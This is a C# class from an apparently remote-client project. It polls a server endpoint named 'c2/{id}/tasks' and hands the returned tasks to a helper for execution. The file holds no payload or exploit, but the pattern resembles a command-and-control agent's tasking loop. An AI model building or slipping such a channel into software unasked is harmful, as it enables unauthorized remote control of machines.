using Microsoft.Extensions.Options;
using nucleus_remote_client.Lib;
using nucleus_remote_client.Tasks;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http.Json;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;

namespace nucleus_remote_client.ClientImpl
{
    internal class GetConfigurationTasks : IClient
    {

        public async Task<HttpResponseMessage?> ExecuteAsync(HostSettings hostSettings)
        {
            var client = ClientHelper.GetHttpClient(hostSettings);
            var tasks = await client.GetFromJsonAsync<TaskContainer[]>($"c2/{hostSettings.Id}/tasks");

            if (tasks == null)
            {
                await SendLog.Error(hostSettings, "Cannot parse get tasks response");
                return null;
            }

            await ExecuteTaskHelper.ExecuteTasks(tasks, hostSettings);

            return null;
        }
    }
}
